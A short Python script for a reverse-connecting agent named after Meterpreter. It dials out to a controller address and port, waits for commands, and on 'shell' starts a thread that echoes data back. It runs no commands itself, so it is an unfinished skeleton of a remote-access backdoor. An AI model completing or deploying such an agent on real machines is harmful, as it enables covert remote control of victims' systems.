import socket
import os
import subprocess
import threading

class meterpreter():
    def __init__(self,ip,port):
        self.s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip=ip
        self.port=port
        self.s.connect((self.ip,self.port))
        self.t_list=list()

    def shell_module(self):
        while True:
            r=self.s.recv(1024).decode()
            print(r)
            self.s.sendall(r.encode())
        

    def general_handler(self):
        while True:
            recv=self.s.recv(1024).decode()
            if recv == "shell":
                self.t_list.append(threading.Thread(target=self.shell_module,args=(), daemon=True))
                self.t_list[len(self.t_list)-1].start()
                self.s.sendall("shell".encode())
                self.t_list[len(self.t_list)-1].join()
            else:
                print(f"no module found {recv}")

m=meterpreter("127.0.0.1",3390)
m.general_handler()
